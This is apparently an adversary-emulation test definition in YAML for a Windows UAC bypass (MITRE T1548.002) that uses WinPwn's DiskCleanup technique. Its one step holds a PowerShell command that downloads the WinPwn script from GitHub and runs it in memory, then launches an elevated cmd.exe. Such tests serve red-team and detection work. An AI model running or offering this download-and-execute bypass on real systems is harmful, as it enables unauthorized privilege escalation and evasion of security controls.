api_version: "2.0"
name: WinPwn - UAC Bypass DiskCleanup technique
description: UAC bypass using DiskCleanup technique via function of WinPwn
uuid: 1ed67900-66cd-4b09-b546-2a0ef4431a0c
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1548: Abuse Elevation Control Mechanism'
    subtechniques:
        - 'T1548.002: Bypass User Account Control'
requirements:
    platforms:
        - os: windows
steps:
    - name: winpwn---uac-bypass-diskcleanup-technique
      inline: |-
        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique DiskCleanup
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
